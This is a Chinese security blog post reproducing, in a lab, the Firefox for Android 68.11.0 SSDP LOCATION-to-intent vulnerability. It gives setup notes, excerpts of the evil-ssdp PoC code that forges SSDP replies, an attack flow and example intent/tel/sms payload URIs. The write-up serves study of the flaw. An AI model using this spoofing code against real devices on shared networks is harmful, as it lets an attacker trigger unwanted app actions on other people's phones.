<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="arch3rn4r">
    
    <title>
        
            基于LAN的intent触发 |
        
        arch3rn4r
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/font/css/fontawesome.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/font/css/regular.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/font/css/solid.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/hexo-theme-keep/4.2.3/font/css/brands.min.css">
    
        
            
        
            
                
<link rel="stylesheet" href="/css/custom.css">

            
        
    
    <script class="keep-theme-configurations">
    const KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"arch3rn4r.github.io","root":"/","language":"zh-CN","path":"search.json"}
    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"arch3rn4r","author":"arch3rn4r","avatar":"/images/beauty/myhead.svg"},"menu":{"home":"/                        || fa-solid fa-home","archives":"/archives            || fa-solid fa-box-archive","tags":"/tags                    || fa-solid fa-tags","about":"/about                || fa-solid fa-user-graduate"},"first_screen":{"enable":true,"background_img":"/images/beauty/bg.jpg","background_img_dark":"https://arch3rn4r.github.io/picx-images-hosting/20240915/EYnModKVcAAy6sw.4g4g8oqoi0.webp","description":"这里是雨季，你那里阳光明媚吗","hitokoto":false},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":true,"hide_header":true},"home":{"announcement":null,"category":false,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":false,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":"ture"},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":true,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default","code_block_shrink":false},"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"left"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":true,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":true},"comment":{"enable":true,"use":"giscus","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.36"},"waline":{"server_url":null,"reaction":false,"version":"3.2.1"},"giscus":{"repo":"arch3rn4r/arch3rn4r.github.io","repo_id":"R_kgDOLnMFhw","category":"Announcements","category_id":"DIC_kwDOLnMFh84Cik-D","reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":true},"lazyload":{"enable":true},"cdn":{"enable":true,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":true,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":true,"css":[null,"/css/custom.css"],"js":[null]},"root":"","source_data":{},"version":"4.2.3"}
    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
  </script>
<meta name="generator" content="Hexo 7.1.1"><link rel="alternate" href="/atom.xml" title="arch3rn4r" type="application/atom+xml">
</head>


<body>
<div class="progress-bar-container">
    

    
</div>



<main class="page-container border-box">
    <!-- home first screen  -->
    

    <!-- page content -->
    <div class="page-main-content border-box">
        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="border-box header-content">
        <div class="left flex-start border-box">
            
            <a class="site-name border-box" href="/">
               arch3rn4r
            </a>
        </div>

        <div class="right border-box">
            <div class="pc border-box">
                <ul class="menu-list border-box">
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/">
                                
                                    <i class="menu-text-color menu-icon fa-solid fa-home"></i>
                                
                                首页
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/archives">
                                
                                    <i class="menu-text-color menu-icon fa-solid fa-box-archive"></i>
                                
                                归档
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/tags">
                                
                                    <i class="menu-text-color menu-icon fa-solid fa-tags"></i>
                                
                                标签
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/about">
                                
                                    <i class="menu-text-color menu-icon fa-solid fa-user-graduate"></i>
                                
                                关于
                                
                            </a>
                            
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="menu-text-color fas search fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile border-box flex-start">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list border-box">
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
                            
                                <span class="menu-icon-wrap border-box flex-center">
                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-home"></i>
                                </span>
                            
                            首页
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
                            
                                <span class="menu-icon-wrap border-box flex-center">
                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-box-archive"></i>
                                </span>
                            
                            归档
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
                            
                                <span class="menu-icon-wrap border-box flex-center">
                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-tags"></i>
                                </span>
                            
                            标签
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
                            
                                <span class="menu-icon-wrap border-box flex-center">
                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-user-graduate"></i>
                                </span>
                            
                            关于
                        </a>
                        
                    </label>
                    
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle border-box">

            <div class="main-content border-box">
                

                    
<div class="fade-in-down-animation">
    <div class="post-page-container border-box">
        <div class="post-content-container border-box">
            

            <div class="post-content-bottom border-box">
                
                    <div class="post-title">
                        基于LAN的intent触发
                    </div>
                

                
                    <div class="post-header border-box">
                        
                            <div class="avatar-box border-box">
                                <img src="/images/beauty/myhead.svg">
                            </div>
                        
                        <div class="info-box">
                            <div class="author border-box">
                                <span class="name">arch3rn4r</span>
                                
                            </div>
                            <div class="meta-info border-box">
                                

<div class="post-meta-info-container border-box post">
    <div class="post-meta-info border-box">
        

        
            <span class="meta-info-item post-create-date">
                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
                <span class="datetime">2025-04-19 18:09:58</span>
            </span>

            <span class="meta-info-item post-update-date">
                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
                <span class="datetime" data-updated="Fri May 02 2025 10:41:59 GMT+0800">2025-05-02 10:41:59</span>
            </span>
        

        

        

        
        
            <span class="meta-info-item post-wordcount">
                <i class="icon fas fa-file-word"></i>&nbsp;<span>4.7k 字</span>
            </span>
        
        
        
    </div>

    
</div>

                            </div>
                        </div>
                    </div>
                

                <div class="post-content keep-markdown-body ">
                    

                    
                         <h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><p>Firefox for Android（68.11.0 及更低版本）会发送定期发送SSDP信息，在其解析LCATION时没有正确验证LOCATION字段的的信息，它错误地将 LOCATION 字段里的<strong>任何字符串</strong>（包括 intent:&#x2F;&#x2F; 这种非标准的 URI）直接传递给了 Android 系统的 Intent 处理机制。（打开 Web 浏览器的 URI 方案定义为 <code>http</code> 或 <code>https</code>。但是，Firefox 移动版中的原生 SSDP 代码会自行处理这些 URL，而不会将它们传递给 Intent 系统。）</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>低版本的Firefox for Android下载地址:<a class="link"   target="_blank" rel="noopener" href="https://archive.mozilla.org/pub/mobile/releases/68.11.0/" >https://archive.mozilla.org/pub/mobile/releases/68.11.0/<i class="fas fa-external-link-alt"></i></a><br>测试脚本:<a class="link"   target="_blank" rel="noopener" href="https://initblog.com/images/post-firefox/ffssdp.py" >https://initblog.com/images/post-firefox/ffssdp.py<i class="fas fa-external-link-alt"></i></a><br>测试设备：安装了目标版本的pixel4，kali Linux 虚拟机（wireshark，python3)<br>环境搭建：电脑和手机连接同一热点，使用wireshark进行抓包<br>在此次测试中的ip地址：<br>测试手机：192.168.165.49<br>电脑物理机：192.168.165.247<br>电脑虚拟机：192.168.165.40 </p>
<p><strong>注意事项</strong>：<br>1.虚拟机使用桥接模式，ip addr查看当前网段是否正确。在物理主机ipconfig和测试手机ifconfig查看当前网络信息，确保网段一致</p>
<p>2.使用wireshark抓包接口,比如现在就要抓包eth0处的流量</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">─# ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 00:0c:29:0c:2d:ba brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.43.40/24 brd 192.168.43.255 scope global dynamic eth0</span><br><span class="line">       valid_lft 2280sec preferred_lft 2280sec</span><br><span class="line">    inet6 fe80::20c:29ff:fe0c:2dba/64 scope link </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>3.不要使用测试手机开热点，手机作为NAT网关时，默认<strong>隔离客户端间通信</strong>（类似AP隔离模式），此时抓包，只能收到热点手机大量的MDNS流量，局域网内的其他设备流量是正常的<img  
                       lazyload
                       alt="image"
                       data-src="https://archernar.oss-cn-guangzhou.aliyuncs.com/test/Pasted%20image%2020250419110240.png"
                       
                 ></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="SSDP"><a href="#SSDP" class="headerlink" title="SSDP"></a>SSDP</h3><p>简单服务发现协议**（ <a class="link"   target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%AE%80%E5%8D%95%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0%E5%8D%8F%E8%AE%AE" >SSDP<i class="fas fa-external-link-alt"></i></a>，Simple Service Discovery Protocol）是一种应用层协议，是构成<a class="link"   target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E9%80%9A%E7%94%A8%E5%8D%B3%E6%8F%92%E5%8D%B3%E7%94%A8"  title="通用即插即用">通用即插即用<i class="fas fa-external-link-alt"></i></a>(UPnP)技术的核心协议之一。用于在本地网络中自动发现设备和服务。它基于HTTPU（HTTP over UDP），通常使用UDP端口1900，多播地址239.255.255.250。M-SEARCH方法是SSDP协议中的一种请求类型，用于设备主动搜索特定类型的服务。<br>在 SSDP 中，发起方将通过本地网络发送广播，询问有关任何可用服务的详细信息，例如第二屏幕设备或联网扬声器。任何系统都可以回复有关描述其特定服务的 XML 文件位置的详细信息。然后，发起方将自动转到该位置以解析 XML。<br>它发出的包和响应包如下所示</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">M-SEARCH * HTTP/1.1</span><br><span class="line">HOST: 239.255.255.250:1900</span><br><span class="line">MAN: &quot;ssdp:discover&quot;</span><br><span class="line">MX: 2</span><br><span class="line">ST: roku:ecp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">CACHE-CONTROL: max-age=1800</span><br><span class="line">DATE: Sat, 19 Apr 2025 07:29:47 GMT</span><br><span class="line">EXT:</span><br><span class="line">LOCATION: http://example.com/device.xml</span><br><span class="line">OPT: &quot;http://schemas.upnp.org/upnp/1/0/&quot;; ns=01</span><br><span class="line">01-NLS: uuid:6702957a-5614-1dc2-4c5a-df6ea40161e2</span><br><span class="line">SERVER: UPnP/1.0</span><br><span class="line">ST: roku:ecp</span><br><span class="line">USN: uuid:6702957a-5614-1dc2-4c5a-df6ea40161e2::roku:ecp</span><br><span class="line">BOOTID.UPNP.ORG: 0</span><br><span class="line">CONFIGID.UPNP.ORG: 1</span><br></pre></td></tr></table></figure>
<p>SSDP 在 UDP 上使用两种形式的 HTTP：</p>
<ul>
<li>HTTPMU：基于多播 UDP 的 HTTP。这意味着请求通过 UDP 广播到整个网络。这用于客户端发现设备和服务器通告设备。</li>
<li>HTTPU：基于单播 UDP 的 HTTP。这意味着请求通过 UDP 从一个主机直接发送到另一个主机。这用于响应搜索请求。<br>LOCATION的值是一个URL，这个URL会指向一个xml文件，它遵循 UPnP 设备描述规范。它里面包含了关于设备的元数据和指向其他控制&#x2F;事件 URL 的信息。<br>需要注意的是，漏洞源于 Firefox 浏览器对 SSDP 响应中 LOCATION 字段的解析逻辑，而非 SSDP 协议本身或 XML 文件的解析过程。</li>
</ul>
<h3 id="脚本分析"><a href="#脚本分析" class="headerlink" title="脚本分析"></a>脚本分析</h3><p><a class="link"   target="_blank" rel="noopener" href="https://initblog.com/images/post-firefox/ffssdp.py" >ffssdp.py<i class="fas fa-external-link-alt"></i></a>来自作者之前编写的工具<a class="link"   target="_blank" rel="noopener" href="https://github.com/initstring/evil-ssdp" >evil-ssdp<i class="fas fa-external-link-alt"></i></a><br>它只能在linux中使用，因为它查找ip的途径是ifconfig</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_ip</span>(<span class="params">args</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    This function will attempt to automatically get the IP address of the</span></span><br><span class="line"><span class="string">    provided interface.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    ip_regex = <span class="string">r&#x27;inet (?:addr:)?(.*?) &#x27;</span></span><br><span class="line">    sys_ifconfig = os.popen(<span class="string">&#x27;ifconfig &#x27;</span> + args.interface).read()</span><br><span class="line">    local_ip = re.findall(ip_regex, sys_ifconfig)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> local_ip[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">except</span> IndexError:</span><br><span class="line">        <span class="built_in">print</span>(PC.warn_box + <span class="string">&quot;Could not get network interface info. &quot;</span></span><br><span class="line">              <span class="string">&quot;Please check and try again.&quot;</span>)</span><br><span class="line">        sys.exit()</span><br></pre></td></tr></table></figure>
<p>它不主动攻击，而是等待局域网中出现SSDP信息，然后对其进行回应<br>核心部分<br>伪造回应</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">send_location</span>(<span class="params">self, address, requested_st</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        This function replies back to clients letting them know where they can</span></span><br><span class="line"><span class="string">        access more information about our device. The keys here are the</span></span><br><span class="line"><span class="string">        &#x27;LOCATION&#x27; header and the &#x27;ST&#x27; header.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        When a client receives this information back on the port they</span></span><br><span class="line"><span class="string">        initiated a discover from, they will go to that location to look for an</span></span><br><span class="line"><span class="string">        XML file.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        url = self.target</span><br><span class="line">        date_format = formatdate(timeval=<span class="literal">None</span>, localtime=<span class="literal">False</span>, usegmt=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">        ssdp_reply = (<span class="string">&#x27;HTTP/1.1 200 OK\r\n&#x27;</span></span><br><span class="line">                      <span class="string">&#x27;CACHE-CONTROL: max-age=1800\r\n&#x27;</span></span><br><span class="line">                      <span class="string">&#x27;DATE: &#123;&#125;\r\n&#x27;</span></span><br><span class="line">                      <span class="string">&#x27;EXT:\r\n&#x27;</span></span><br><span class="line">                      <span class="string">&#x27;LOCATION: &#123;&#125;\r\n&#x27;</span></span><br><span class="line">                      <span class="string">&#x27;OPT: &quot;http://schemas.upnp.org/upnp/1/0/&quot;; ns=01\r\n&#x27;</span></span><br><span class="line">                      <span class="string">&#x27;01-NLS: &#123;&#125;\r\n&#x27;</span></span><br><span class="line">                      <span class="string">&#x27;SERVER: UPnP/1.0\r\n&#x27;</span></span><br><span class="line">                      <span class="string">&#x27;ST: &#123;&#125;\r\n&#x27;</span></span><br><span class="line">                      <span class="string">&#x27;USN: &#123;&#125;::&#123;&#125;\r\n&#x27;</span></span><br><span class="line">                      <span class="string">&#x27;BOOTID.UPNP.ORG: 0\r\n&#x27;</span></span><br><span class="line">                      <span class="string">&#x27;CONFIGID.UPNP.ORG: 1\r\n&#x27;</span></span><br><span class="line">                      <span class="string">&#x27;\r\n\r\n&#x27;</span></span><br><span class="line">                      .<span class="built_in">format</span>(date_format,</span><br><span class="line">                              url,</span><br><span class="line">                              self.session_usn,</span><br><span class="line">                              requested_st,</span><br><span class="line">                              self.session_usn,</span><br><span class="line">                              requested_st))</span><br><span class="line">        ssdp_reply = <span class="built_in">bytes</span>(ssdp_reply, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        self.sock.sendto(ssdp_reply, address)</span><br></pre></td></tr></table></figure>
<p><strong>总结攻击流程:</strong></p>
<ol>
<li><strong>被动监听:</strong> 脚本在指定的网络接口上监听发往 SSDP 多播地址 (239.255.255.250:1900) 的 UDP 包。    </li>
<li><strong>捕获请求:</strong> 当收到一个包含 “M-SEARCH” 和有效 ST: 头部的 UDP 包时，记录下发送方的 IP 和端口。    </li>
<li><strong>条件判断:</strong> 如果不是分析模式，并且 ST 格式基本正确。    </li>
<li><strong>构造响应:</strong> 创建一个虚假的 SSDP 200 OK 响应。    </li>
<li><strong>注入载荷:</strong> 将用户指定的<strong>恶意 Intent URI</strong> 放入响应的 LOCATION 头部。    </li>
<li><strong>定向回击:</strong> 将这个伪造的、包含恶意 LOCATION 的响应直接发送回发送 M-SEARCH 请求的设备 IP 和端口。    </li>
<li><strong>漏洞触发 (在目标设备上):</strong> 如果接收设备是运行着易受攻击 Firefox 的 Android 设备，Firefox 会错误处理这个响应，将 LOCATION 字段的恶意 URI 交给 Android Intent 系统执行，导致非预期的行为（如打开拨号器）。</li>
</ol>
<h3 id="构建payload"><a href="#构建payload" class="headerlink" title="构建payload"></a>构建payload</h3><p>将-t后面替换成这里构造的语句就可以进行测试了</p>
<h4 id="拨号器"><a href="#拨号器" class="headerlink" title="拨号器"></a>拨号器</h4><p>Android 的核心应用程序之一 <strong>“拨号器” (Dialer)</strong> 在其 AndroidManifest.xml 中注册了一个 <strong>Intent Filter</strong>。这个 Intent Filter 声明它可以处理 ACTION_DIAL 或 ACTION_VIEW 类型的 Intent，并且其数据 (Data) 的 <strong>Scheme 是 tel</strong>。当你点击一个 tel:&#x2F;&#x2F;20250418 链接，或者某个应用（像这个漏洞中的 Firefox）将这个 URI 传递给系统时，Android 的 <strong>PackageManager</strong> 会查找哪个应用注册了能够处理 tel Scheme 的 Intent Filter。<br>PackageManager 找到了拨号器应用，系统启动拨号器应用，并将 20250418 这个号码传递给它，拨号器就会显示这个号码，等待用户确认拨打。</p>
<p>还有这样可以用于测试的scheme吗？</p>
<ul>
<li><strong>标准化组织:</strong> 一些最常见的 Schemes（如 http, https, ftp, mailto）是由互联网工程任务组 (IETF) 通过 RFC 文档标准化的。    </li>
<li><strong>平台约定:</strong> 其他一些 Schemes（如 tel, sms, geo - 地理位置）虽然可能没有严格的全球标准，但在特定平台（如 Android、iOS）上被广泛支持和理解，成为了事实上的标准。操作系统或核心应用程序（如拨号器、短信应用）会注册自己来处理这些 Schemes。</li>
</ul>
<p>这里有一些例子，除了拨号器和文件，其他的我没有进行测试，仅供参考</p>
<p><strong>sms: 或 smsto:</strong><br>    - <strong>触发应用:</strong> 默认的短信&#x2F;彩信应用。<br>    - <strong>作用:</strong> 打开短信编辑界面。<br>    - <strong>示例:</strong><br>        - sms:10086 (打开短信应用，收件人填好 10086)<br>        - sms:10086?body&#x3D;Hello (打开短信应用，填好收件人和短信内容 “Hello”)<br>        - smsto:10086 (功能类似，sms: 更常用)<br> <strong>mailto:</strong><br>    - <strong>触发应用:</strong> 默认的电子邮件客户端 (如 Gmail)。<br>    - <strong>作用:</strong> 打开邮件编辑界面。<br>    - <strong>示例:</strong><br>        - mailto:<a class="link"   href="mailto:&#117;&#115;&#x65;&#114;&#x40;&#101;&#120;&#97;&#109;&#x70;&#108;&#101;&#x2e;&#99;&#x6f;&#109;" >&#117;&#115;&#x65;&#114;&#x40;&#101;&#120;&#97;&#109;&#x70;&#108;&#101;&#x2e;&#99;&#x6f;&#109;<i class="fas fa-external-link-alt"></i></a> (打开邮件应用，填好收件人)<br>        - mailto:<a class="link"   href="mailto:&#x75;&#115;&#x65;&#114;&#x40;&#x65;&#x78;&#x61;&#109;&#x70;&#108;&#101;&#46;&#x63;&#111;&#109;" >&#x75;&#115;&#x65;&#114;&#x40;&#x65;&#x78;&#x61;&#109;&#x70;&#108;&#101;&#46;&#x63;&#111;&#109;<i class="fas fa-external-link-alt"></i></a>?subject&#x3D;Inquiry&amp;body&#x3D;Hi%20there (填好收件人、主题和正文，注意正文需要 URL 编码)<br>        - mailto:?to&#x3D;<a class="link"   href="mailto:&#117;&#115;&#101;&#114;&#49;&#64;&#x65;&#x78;&#97;&#109;&#x70;&#x6c;&#x65;&#46;&#x63;&#111;&#x6d;" >&#117;&#115;&#101;&#114;&#49;&#64;&#x65;&#x78;&#97;&#109;&#x70;&#x6c;&#x65;&#46;&#x63;&#111;&#x6d;<i class="fas fa-external-link-alt"></i></a>&amp;cc&#x3D;<a class="link"   href="mailto:&#x75;&#115;&#x65;&#x72;&#x32;&#x40;&#101;&#x78;&#97;&#x6d;&#x70;&#x6c;&#101;&#x2e;&#x63;&#x6f;&#x6d;" >&#x75;&#115;&#x65;&#x72;&#x32;&#x40;&#101;&#x78;&#97;&#x6d;&#x70;&#x6c;&#101;&#x2e;&#x63;&#x6f;&#x6d;<i class="fas fa-external-link-alt"></i></a> (指定收件人和抄送)<br><strong>http: 或 https:</strong><br>    - <strong>触发应用:</strong> 默认的网络浏览器 (如 Chrome, Firefox)。<br>    - <strong>作用:</strong> 在浏览器中打开指定的网页。<br>    - <strong>示例:</strong><br>        - <a class="link"   target="_blank" rel="noopener" href="http://www.google.com/" >http://www.google.com<i class="fas fa-external-link-alt"></i></a>      </p>
<p><strong>geo:</strong><br>    - <strong>触发应用:</strong> 默认的地图应用 (如 Google Maps)。<br>    - <strong>作用:</strong> 显示地理位置或进行地点搜索。<br>    - <strong>示例:</strong><br>        - geo:39.9042,116.4074 (显示北京的经纬度位置)<br>        - geo:0,0?q&#x3D;Eiffel+Tower (搜索埃菲尔铁塔的位置)<br>        - geo:0,0?q&#x3D;39.9042,116.4074(Beijing) (显示经纬度位置并添加标签 “Beijing”)<br> <strong>market:</strong><br>    - <strong>触发应用:</strong> Google Play Store 应用商店。<br>    - <strong>作用:</strong> 打开 Play Store 到指定的应用详情页、开发者页面或搜索结果。<br>    - <strong>示例:</strong><br>        - market:&#x2F;&#x2F;details?id&#x3D;com.google.android.apps.maps (打开 Google Maps 的应用详情页)<br>        - market:&#x2F;&#x2F;search?q&#x3D;browser (在 Play Store 中搜索 “browser”)<br>        - market:&#x2F;&#x2F;developer?id&#x3D;Google+LLC (打开 Google LLC 的开发者页面)</p>
<p> <strong>file:</strong><br>    - <strong>触发应用:</strong> 文件管理器应用（如果安装并注册了处理此 Scheme）。<br>    - <strong>作用:</strong> 尝试打开本地文件。<br>    - <strong>重要说明:</strong> 出于安全原因，Android 对 file:&#x2F;&#x2F; URI 的访问有<strong>严格限制</strong>。应用通常不能随意访问其他应用的私有文件或任意的本地文件路径。直接从浏览器或不可信来源触发 file:&#x2F;&#x2F; URI 通常会被阻止或功能受限。应用内部访问文件通常使用 content:&#x2F;&#x2F; URI (通过 ContentProvider) 或 Storage Access Framework。<br>    - <strong>示例 (可能受限):</strong> file:&#x2F;&#x2F;&#x2F;sdcard&#x2F;Download&#x2F;document.pdf</p>
<h4 id="Android-intent-URI"><a href="#Android-intent-URI" class="headerlink" title="Android intent URI"></a>Android intent URI</h4><p>具体来源：<a class="link"   target="_blank" rel="noopener" href="https://www.google.com/url?sa=E&q=https://cs.android.com/" >cs.android.com<i class="fas fa-external-link-alt"></i></a><br>查找frameworks&#x2F;base&#x2F;core&#x2F;java&#x2F;android&#x2F;content&#x2F;Intent.java 文件，这里面有具体的原因，更详细<br>在这里给出已经总结好的结构</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">intent:<span class="comment">//host/path#Intent;</span></span><br><span class="line">    <span class="keyword">package</span>=&lt;package_name&gt;;</span><br><span class="line">    scheme=&lt;scheme_type&gt;;</span><br><span class="line">    action=&lt;action_name&gt;;</span><br><span class="line">    category=&lt;category&gt;;</span><br><span class="line">    component=&lt;component_path&gt;;</span><br><span class="line">    S.&lt;extra_key&gt;=&lt;extra_value&gt;;</span><br><span class="line">    end</span><br></pre></td></tr></table></figure>
<p>解释</p>
<ul>
<li><strong>intent</strong>:Scheme (协议头):这是整个 URI 的协议标识符。它告诉 Android 系统，这个 URI 不是一个普通的网页链接、文件路径或电话号码，而是一个需要被解析成 Android Intent 对象的特殊指令。</li>
<li><strong>#Intent;…;end</strong>:- <strong>Fragment (片段标识符):</strong> 这是 Intent URI 的核心部分，使用 # 号开始。它包含了一系列**键值对 (key&#x3D;value)**，用分号 (;) 分隔，用来描述 Intent 对象的各种属性（Action, Category, Package, Component, Extras 等）。Intent代表开始，end代表结束</li>
<li><strong>键值对属性</strong> (在 #Intent; 和 ;end 之间):<ul>
<li><strong>package&#x3D;<package_name><strong>（可选）:指定</strong>唯一</strong>能够处理此 Intent 的应用程序包名。</li>
